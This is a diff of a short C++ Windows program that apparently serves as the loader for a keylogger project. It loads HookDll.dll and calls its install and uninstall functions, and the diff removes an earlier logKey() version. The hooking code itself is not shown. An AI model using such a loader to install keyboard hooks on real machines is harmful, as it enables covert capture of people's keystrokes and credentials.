@@ -5,37 +5,26 @@
 #include <windows.h>
 #include <iostream>
 
-void logKey();
-
 int _tmain(int argc, _TCHAR* argv[])
 {
-	logKey();
+
+	HINSTANCE hinst = LoadLibrary(_T("HookDll.dll"));
+	if (hinst == NULL)
+	{
+		printf("null hinst");
+	}
+	typedef void(*Install)();
+	typedef void(*Uninstall)();
+
+	Install install = (Install)GetProcAddress(hinst, "install");
+	Uninstall uninstall = (Uninstall)GetProcAddress(hinst, "uninstall");
+
+
+	install();
+	int foo;
+	std::cin >> foo;
+
+	uninstall();
 	return 0;
-}
 
-void logKey() {
-	//while (true) {
-		static HINSTANCE hinstDLL;
-		static HHOOK hhookSysMsg;
-
-		hinstDLL = LoadLibrary(_T("HookDll.dll"));
-
-		if (hinstDLL == NULL)
-		{
-		  printf("null hinst");
-		  printf("cd C:\\Users\\Kodie Glosser\\Documents\\GitHub\\Keylogger\\HookDll\\Debug\\HookDll.dll");
-		  return;
-		} 
-
-		typedef void (*Install)();
-		Install install = (Install)GetProcAddress(hinstDLL, "install");
-
-		//hkprcSysMsg = (HOOKPROC)GetProcAddress(hinstDLL, "install");
-
-		//hhookSysMsg = SetWindowsHookEx(WH_SYSMSGFILTER, hkprcSysMsg, hinstDLL, 0);
-		install();
-		int i;
-		std::cout << hhookSysMsg << std::endl;
-		std::cin >> i;
-	//}
 }
